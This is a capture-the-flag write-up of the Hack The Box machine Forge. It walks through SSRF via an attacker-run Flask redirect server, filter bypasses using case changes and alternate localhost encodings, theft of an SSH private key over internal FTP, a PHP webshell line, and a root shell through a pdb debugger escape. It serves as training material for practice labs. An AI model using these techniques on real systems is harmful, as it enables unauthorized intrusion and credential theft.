---
title: HTB: Forge
url: https://0xdf.gitlab.io/2022/01/22/htb-forge.html
date: 2022-01-22T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, htb-forge, hackthebox, nmap, wfuzz, ssrf, feroxbuster, vhosts, filter, redirection, flask, python, pdb, youtube, oscp-plus-v2, oscp-like-v2, osep-like
---

![Forge](https://0xdfimages.gitlab.io/img/forge-cover.png)

The website on Forge has an server-side request forgery (SSRF) vulnerability that I can use to access the admin site, available only from localhost. But to do that, I have to bypass a deny list of terms in the given URL. I’ll have the server contact me, and return a redirect to the site I actually want to have it visit. From the admin site, I can see that it too has an SSRF, and it can manage FTP as well. I’ll update my redirect to have it fetch files from the local FTP server, including the user flag and the user’s SSH private key. The user is able to run a Python script as root, and because of how this script uses PDB (the Python debugger), I can exploit the crash to get a shell as root. In Beyond Root, I’ll look at bypassing the filter, and explore the webserver configuration to figure out how the webserver talks FTP.

## Box Info

| Name | [Forge](https://hackthebox.com/machines/forge)  [Forge](https://hackthebox.com/machines/forge) [Play on HackTheBox](https://hackthebox.com/machines/forge) |
| --- | --- |
| Release Date | [11 Sep 2021](https://twitter.com/hackthebox_eu/status/1483831974552911872) |
| Retire Date | 22 Jan 2022 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Forge |
| Radar Graph | Radar chart for Forge |
| First Blood User | 00:09:33[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| First Blood Root | 00:11:52[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| Creator | [NoobHacker9999 NoobHacker9999](https://app.hackthebox.com/users/393721) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.111
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-19 17:18 EDT
Warning: 10.10.11.111 giving up on port because retransmission cap hit (10).
Nmap scan report for stacked.htb (10.10.11.111)
Host is up (0.10s latency).
Not shown: 65532 closed ports
PORT   STATE    SERVICE
21/tcp filtered ftp
22/tcp open     ssh
80/tcp open     http

Nmap done: 1 IP address (1 host up) scanned in 92.16 seconds
oxdf@parrot$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.111
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-19 17:20 EDT
Nmap scan report for stacked.htb (10.10.11.111)
Host is up (0.096s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://forge.htb
Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.20 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 Focal.

There’s something blocking port 21, FTP. This is likely a firewall, and that means that FTP is likely running behind it.

`nmap` also notes that the site returns a redirect to `http://forge.htb`.

### VHosts

Given the use of the domain name, I’ll start a brute force run for subdomains using `wfuzz`. The `-H "Host: FUZZ.forge.htb"` option will try with different host headers and I can look for any that don’t match the default case. I’ll start it with no filtering to get a feel for the default case. The number of characters changes based on the length of the subdomain, but the number of words does not, so I’ll use `--hw 26`:

```

oxdf@parrot$ wfuzz -u http://10.10.11.111 -H "Host: FUZZ.forge.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 26
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.111/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000024:   200        1 L      4 W        27 Ch       "admin"
000009532:   400        12 L     53 W       425 Ch      "#www"
000010581:   400        12 L     53 W       425 Ch      "#mail"                                             

Total time: 0
Processed Requests: 19966
Filtered Requests: 19963
Requests/sec.: 0

```

The only interesting one there is `admin.forge.htb`. I’ll add both the domain and the subdomain to `/etc/hosts`.

### forge.htb - TCP 80

#### Site

The site is a gallery for images:

![](https://0xdfimages.gitlab.io/img/image-20210819174629506-16294236916591.png)

Clicking on Upload an image load a new form at `/upload`:

![](https://0xdfimages.gitlab.io/img/image-20210819174812446-16294237232432.png)

The form takes a local file. Clicking on Upload from url changes the local file selector into a field for a url:

![](https://0xdfimages.gitlab.io/img/image-20210819174833961-16294237360103.png)

Giving the first form an image file, it returns a URL to where it has uploaded:

![](https://0xdfimages.gitlab.io/img/image-20210819182850258-16294237933534.png)

Following that link leads back to the image:

![](https://0xdfimages.gitlab.io/img/image-20210819182919605-16294238380655.png)

If I upload a file with text in it, like a PHP webshell, the page does still return a link, but that link is not viewable in Firefox:

![](https://0xdfimages.gitlab.io/img/image-20210819183029723-16294238590576.png)

That’s because the response contains a content type header of an image:

```

HTTP/1.1 200 OK
Date: Thu, 19 Aug 2021 22:30:14 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Disposition: inline; filename=28C0mwXLXZBu1BkVHClV
Content-Length: 44
Last-Modified: Thu, 19 Aug 2021 22:30:13 GMT
Cache-Control: no-cache
Connection: close
Content-Type: image/jpg

<?php echo shell_exec($_REQUEST["cmd"]); ?>

```

Still, the text is in there, and not executed, which means the site isn’t handling the upload as PHP.

Shifting to the url upload, I started a Python webserver (`python3 -m http.server 80`) in a directory with images and the PHP webshell. Passing it my url produced the same results as with the local file upload. Images were displayed back. Text was returned and not executed.

#### Tech Stack

The HTTP response headers didn’t give much information about the server beyond that it’s Apache:

```

HTTP/1.1 200 OK
Date: Thu, 19 Aug 2021 21:35:50 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 2050

```

I did kill the webserver and listen with `nc` to catch one of the HTTP requests coming from the site:

```

oxdf@parrot$ nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.111] 34312
GET / HTTP/1.1
Host: 10.10.14.6
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

```

The `User-Agent` of `python-requests/2.25.1` is interesting. It suggests that the webserver is almost certainly Python (I’d guess Flask given the simplicity).

#### Directory Brute Force

I’ll run `feroxbuster` against the site, but it doesn’t find anything useful:

```

oxdf@parrot$ feroxbuster -u http://forge.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://forge.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200       33l       58w      929c http://forge.htb/upload
301        4l       24w      224c http://forge.htb/uploads
301        9l       28w      307c http://forge.htb/static
301        9l       28w      314c http://forge.htb/static/images
301        9l       28w      311c http://forge.htb/static/css
[####################] - 16s   149995/149995  0s      found:5       errors:130797 
[####################] - 15s    29999/29999   1935/s  http://forge.htb
[####################] - 15s    29999/29999   1996/s  http://forge.htb/uploads
[####################] - 15s    29999/29999   1958/s  http://forge.htb/static
[####################] - 14s    29999/29999   2055/s  http://forge.htb/static/images
[####################] - 14s    29999/29999   2045/s  http://forge.htb/static/css

```

### admin.forge.htb

Visiting admin.forge.htb just returns a message that only localhost can visit:

![](https://0xdfimages.gitlab.io/img/image-20210819184922819-16294240469537.png)

## Shell as user

### SSRF Fails

Based on that enumeration, there are two interesting targets:
- The admin site which can only be accessed from localhost;
- The FTP server which is behind the firewall.

The first thing I tried was giving the upload page the url `http://admin.forge.htb`. Unfortunately, the page returned an error:

![](https://0xdfimages.gitlab.io/img/image-20210819185307674.png)

I tried to access FTP by giving it `ftp://127.0.0.1`, but this returns another error:

![](https://0xdfimages.gitlab.io/img/image-20210819185711944-16294244597221.png)

I tried several of the basic bypasses, and it turns out this is a pretty bad filter. I’ll dig into it in [Beyond Root](#filter-bypasses).

### Redirection to Admin

Instead of bypassing the filter directly, I’ll show a redirect bypass.

I know that it’s a Python script that is handling my input, making filtering decisions, and then using the `requests` module to make the HTTP request. The requests module by default will follow HTTP redirects unless the function is called with `allow_redirects=False`.

My strategy is to have the site request a url on my host. That will pass any filtering without issue. The webserver will return an HTTP redirect back to `http://admin.forge.htb`, which `requests` will follow, and the resulting text will be made available to me via the link.

I’ll write a simple Flask server to do this:

```

#!/usr/bin/env python

from flask import Flask, redirect, request

app = Flask(__name__)

@app.route("/")
def admin():
    return redirect('http://admin.forge.htb/')

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=80)    

```

The idea here is that I can pass it the URL to my server. Now when I give the site `http://10.10.14.6/`, there’s a request at the Flask server, and then the site returns a link, which I’ll fetch with `curl`:

```

<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>

```

There’s not a ton there on the admins page, other than links to `/announcements` and `/upload`.

I’ll add another route in the Flask source to collect `announcements`:

```

@app.route("/1")
def annoucements():
    return redirect('http://admin.forge.htb/announcements')

```

Now I’ll pass `http://10.10.14.6/1` into the SSRF, and the resulting page has a few clues:

```

<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>

```

The FTP server has creds user / heightofsecurity123!. The `/upload` url that supports FTP and works as a GET request.

It’s strange to me that the site now supports FTP, since I know it’s using `requests`, which doesn’t. But I’ll trust the site, and dig into this in [Beyond Root](#web-server-config-and-requests--ftp).

### FTP

My first attempt to get to FTP was with another endpoint in Flask to direct to it:

```

@app.route("/2")
def ftp_direct():
    return redirect('ftp://user:heightofsecurity123!@127.0.0.1')   

```

Unfortunately, the page returned an error:

![](https://0xdfimages.gitlab.io/img/image-20210819211509764-16294244772732.png)

Of course, the base domain `/upload` support FTP (I already knew that from recon). But there is a `/upload` on `admin.forge.htb` as well. The announcements page must be talking about that one. I’ll use a redirect to the admin upload page to get it to fetch from FTP.

I’ll write a slightly more generic Flask route this time. This route will do the indirect FTP, and it will allow me to pass a GET parameter, `f` to specify the file to get if this works:

```

@app.route("/3")
def ftp_via_admin():
    f = request.args.get('f', default='')
    return redirect(f'http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/{f}')  

```

Submitting `http://10.10.14.6/3` returned a listing of the files in FTP:

```

drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 May 31 12:23 user.txt 

```

`http://10.10.14.6/3?f=user.txt` returns the user flag.

Next I’ll try `http://10.10.14.6/3?f=.ssh/`:

```
-rw-------    1 1000     1000          564 May 31 12:35 authorized_keys
-rw-------    1 1000     1000         2590 May 20 08:30 id_rsa
-rw-------    1 1000     1000          564 May 20 08:30 id_rsa.pub 

```

I’ll grab the `id_rsa`.

### SSRF / Redirection Summary

To summarize this attack:

[![](https://0xdfimages.gitlab.io/img/Forge-redirect.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/Forge-redirect.png)
1. I submit `http://10.10.14.6/3?f=.ssh/` as the URL to `/upload` on `forge.htb`.
2. The filter checks, and approves the URL.
3. `forge.htb` requests `/3?.f=.ssh/` from Flask.
4. Flask Returns a 302 redirect to `http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/.ssh/`. This will send `forge.htb` to `/upload` on `admin.forge.htb`, which can handle FTP, with get parameters to connect to the local FTP server,
5. `admin.forge.htb` requests a listing of the `/.ssh/` directory from FTP.
6. FTP returns the result, through `admin.forge.htb` which returns them to `forge.htb`.
7. `forge.htb` saves the results in the `/uploads` directory with a random name.
8. The URL to that saved file is returned to me.

### SSH

The key works to get a shell as user over SSH:

```

oxdf@parrot$ ssh -i ~/keys/forge-user user@forge.htb      
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)                   ...[snip]...
user@forge:~$

```

## Shell as root

### Enumeration

`sudo -l` gives a clear focus for root:

```

user@forge:~$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py

```

user can run this Python script as root without a password.

The script is some kind of remote management enabler:

```

#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n') 
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2: 
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3: 
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4: 
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()

```

It picks a random port over 1024 and listens on it. When someone connects, they are prompted for the password, “secretadminpassword”. If they give it, they get a menu of four options. Three use `subprocess` to run a command and return the output, and the last option exits.

I can run this and it prints that it’s listening:

```

user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:28050

```

I’ll SSH in to get another listener, and connect to that port:

```

user@forge:~$ nc 127.0.0.1 28050                                                
Enter the secret passsword:

```

I’ll enter the password, and get to the menu. The options function as expected:

```

Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do:
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
1
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.5 103980 11496 ?        Ss   Aug19   0:03 /sbin/init maybe-ubiquity
root           2  0.0  0.0      0     0 ?        S    Aug19   0:00 [kthreadd]
...[snip]...
user        2425  0.0  0.0   3332  1996 pts/1    S+   01:33   0:00 nc 127.0.0.1 28050                                
root        2427  0.0  0.0   2608   600 pts/0    S+   01:33   0:00 /bin/sh -c ps aux                                 
root        2428  0.0  0.1   8892  3248 pts/0    R+   01:33   0:00 ps aux
What do you wanna do:
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
2
Filesystem                        1K-blocks    Used Available Use% Mounted on
udev                                 958032       0    958032   0% /dev
tmpfs                                200640    1144    199496   1% /run
/dev/mapper/ubuntu--vg-ubuntu--lv   7155192 3116592   3948864  45% /
...[snip]...
tmpfs                                200636       0    200636   0% /run/user/1000
What do you wanna do:
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
3
State   Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process
LISTEN  0        1              127.0.0.1:28050          0.0.0.0:*
LISTEN  0        32               0.0.0.0:21             0.0.0.0:*
LISTEN  0        4096       127.0.0.53%lo:53             0.0.0.0:*
LISTEN  0        128              0.0.0.0:22             0.0.0.0:*
LISTEN  0        511                    *:80                   *:*                
LISTEN  0        128                 [::]:22                [::]:*                
What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
4
Bye

```

### Exploit

The problem in this script is in how it handles errors. There’s an `except` block for any exception that calls the Python Debugger, `pdb`:

```

except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)

```

`pdb` is great, but it will allow the user interacting with it to run arbitrary Python commands. So if I can make the script throw an exception, I can run commands as root.

The obvious place to generate an exception is here:

```

option = int(clientsock.recv(1024).strip())

```

My input is passed to `int()`. If I give it something that isn’t an integer, Python will raise a `ValueError` exception.

I’ll start the listener again as root:

```

user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:11563

```

Now I’ll connect, give the password, and give a non-integer as the menu option:

```

user@forge:~$ nc 127.0.0.1 11563
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
0xdf

```

This terminal just hangs. Back in the other, there’s an error dump and a `pdb` prompt:

```

user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:11563
invalid literal for int() with base 10: b'0xdf'
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb)

```

One simple way to a shell from here is to use `os.system`:

```

(Pdb) import os
(Pdb) os.system('bash')
root@forge:/home/user#

```

And grab `root.txt`:

```

root@forge:~# cat root.txt
72e7ca6f************************

```

## Beyond Root

### Filter Bypasses

#### Enumerating the Denylist

I wanted to take a closer look at the filter on the url submission, to see if it could be bypassed, and it turned out that it’s relatively weak.

I’ll start with the URL I wanted to use to grab the SSH key:

```

http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/.ssh/

```

I’ll submit that URL and look at the request in Burp:

```

POST /upload HTTP/1.1
Host: forge.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 120
Origin: http://forge.htb
Connection: close
Referer: http://forge.htb/upload
Upgrade-Insecure-Requests: 1

url=http%3A%2F%2Fadmin.forge.htb%2Fupload%3Fu%3Dftp%3A%2F%2Fuser%3Aheightofsecurity123%21%40127.0.0.1%2F.ssh%2F&remote=1

```

I’ll work with that as a `curl` request, piping into `grep` to quickly see if it’s triggered the blacklist:

```

oxdf@hacky$ curl -s -d 'url=http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/.ssh/&remote=1' http://forge.htb/upload | grep blacklisted
            <strong>URL contains a blacklisted address!</strong>

```

My first theory is that “admin” might be triggering it. I know I need to start with “http://” or it will return “Invalid Protocol”. So I’ll try `http://admin` to see if it triggers. It doesn’t, but `http://admin.forge.htb` does:

```

oxdf@hacky$ curl -s -d 'url=http://admin' -d 'remote=1' http://forge.htb/upload | grep blacklisted
oxdf@hacky$ curl -s -d 'url=http://admin.forge.htb' -d 'remote=1' http://forge.htb/upload | grep blacklisted
            <strong>URL contains a blacklisted address!</strong>

```

In fact, just “forge.htb” seem to trigger it:

```

oxdf@hacky$ curl -s -d 'url=http://forge.htb&remote=1' http://forge.htb/upload | grep blacklisted
            <strong>URL contains a blacklisted address!</strong>

```

Similar steps show that “127.0.0.1” and “0.0.0.0” are also blocked.

#### Bypassing

I came up with a short list of potential bypasses, as well as the three known blocked terms:

```

forge.htb
fOrge.htb
fOrge
forge.HTB
127.0.0.1
127.0.0.2
127.1
0177.0.0.01
0x7f.0.0.0x1
0.0.0.0
0
user:heightofsecurity123!@
localhost
loCalhost

```

Now `wfuzz` can try each of these. With the `-hs blacklisted` it will hide responses with the failed term in the response, and show what was allowed:

```

oxdf@hacky$ wfuzz -w denylist-check -d 'url=http://FUZZ&remote=1' --hs blacklist
ed http://forge.htb/upload
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://forge.htb/upload
Total requests: 14

===================================================================
ID           Response   Lines    Word     Chars       Payload                                        
===================================================================

000000007:   200        42 L     75 W     1254 Ch     "127.1"                                        
000000009:   200        42 L     75 W     1254 Ch     "0x7f.0.0.0x1"                                 
000000008:   200        42 L     75 W     1254 Ch     "0177.0.0.01"                                  
000000004:   200        42 L     75 W     1254 Ch     "forge.HTB"                                    
000000003:   200        42 L     75 W     1254 Ch     "fOrge"                                        
000000002:   200        42 L     75 W     1254 Ch     "fOrge.htb"                                    
000000006:   200        42 L     75 W     1254 Ch     "127.0.0.2"                                    
000000012:   200        37 L     73 W     1112 Ch     "user:heightofsecurity123!@"                   
000000011:   200        42 L     75 W     1254 Ch     "0"                                            
000000014:   200        42 L     75 W     1254 Ch     "loCalhost"                                    

Total time: 0.316392
Processed Requests: 14
Filtered Requests: 4
Requests/sec.: 44.24884

```

Alternatively, with `-ss blacklist`, it will show what was blocked:

```

oxdf@hacky$ wfuzz -w denylist-check -d 'url=http://FUZZ&remote=1' --ss blacklisted http://forge.htb/upload
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://forge.htb/upload
Total requests: 13

===================================================================
ID           Response   Lines    Word     Chars       Payload                                        
===================================================================

000000001:   200        37 L     67 W     1048 Ch     "forge.htb"                                    
000000005:   200        37 L     67 W     1048 Ch     "127.0.0.1"                                    
000000010:   200        37 L     67 W     1048 Ch     "0.0.0.0"                                      
000000013:   200        37 L     67 W     1048 Ch     "localhost"                                    

Total time: 0.309301
Processed Requests: 13
Filtered Requests: 9
Requests/sec.: 42.03023

```

It looks like the string checks are case-sensitive, which is easy to bypass. And the IP address are only checking the most basic forms.

Knowing this, I can skip the step of having to build a redirector, and just submit a URL like:

```

http://admin.fOrge.htb/upload?u=ftp://user:heightofsecurity123!@0/.ssh/

```

I’m using case to bypass the domain check, and using `0` as shorthand for 0.0.0.0, which works for any interface on the host. It works.

I’ll look at the webserver config in the next section, but the deny list itself is defined in one line in the Flask:

```

blacklist = ["forge.htb", "127.0.0.1", "10.10.10.10", "::1", :"localhost",
             '0.0.0.0', '[0:0:0:0:0:0:0:0]']

```

That list is applied in one other line later:

```

if any([i for i in blacklist if i in url]):
    return render_template('upload.html', navigation=navigation,
                           message="URL contains a blacklisted address!")

```

It’s looping over the strings in the list and checking if any are in the url.

### Web Server Config (and Requests / FTP?)

To answer the question “how does requests fetch over FTP?” I went on a bit of an exploration. And this is the kind of exploration I recommend everyone do whenever they root a box - Try to understand as much of how the box works as you can. Here’s the [video](https://www.youtube.com/watch?v=l5hx3SO9668):